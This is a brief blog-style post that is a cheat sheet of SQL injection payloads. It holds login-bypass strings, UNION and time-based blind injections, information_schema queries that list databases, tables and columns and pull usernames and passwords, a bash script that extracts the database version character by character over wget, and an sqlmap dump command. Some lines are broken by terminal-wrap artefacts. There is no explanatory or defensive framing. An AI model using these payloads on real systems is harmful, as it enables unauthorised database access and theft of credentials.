---
title: 'SQL Injection (SQLI)'
description: ''
pubDate: 'Jul 08 2022'
heroImage: '/placeholder-hero.jpg'
---

```bash
#SQL Injection
'or 6=6
'or 0x47=0x47
or char(32)=''
or 6 is not null
admin' or 1=1-- -
admin' or true-- -
admin' order by 100-- -
admin' union select(1,2,3,4,5,6)-- -
admin' or '1'= '1
admin' and sleep(5)-- -
admin' and if(substr(database(),1,1)='a',sleep(5),1)-- -
                                          username,0x3a,password from dbmax_admin
                                          column_name from information_schema.columns where ta
       │ ble_schema='dbmax' and table_name='dbmax_admin'
                                          table_name        information_schema.tables where ta
       │ ble_schema='dbmax'
admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),1,1)=
       │ 'a',sleep(5),1)-- -

#Database names
' UniOn  Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]

```

#### Blind sqli

```bash
'and substring(@@version,1,1)='5
### cat blind.sh
charset=`echo {0..9} {A..Z} \n \: \; \, \- \_ \@`

export URL="http://blind.sqli.site/banddetails.php"

export truestring="we worked with them in the past"

for i in $charset; do
wget "$URL?band=the offspring' and substring(@@version,1,1)='$i" -q -O - | grep "$truestring" &> /dev/null

if [ "$?" == "0" ]; then
    echo Character found $i
    break
  fi
done
```
#### sqli basics

```bash
' and 1=2;-- -

### current db 
sqlmap -u http://test.xyz.co
m/admin.php?id=2 --current-db --dump

```
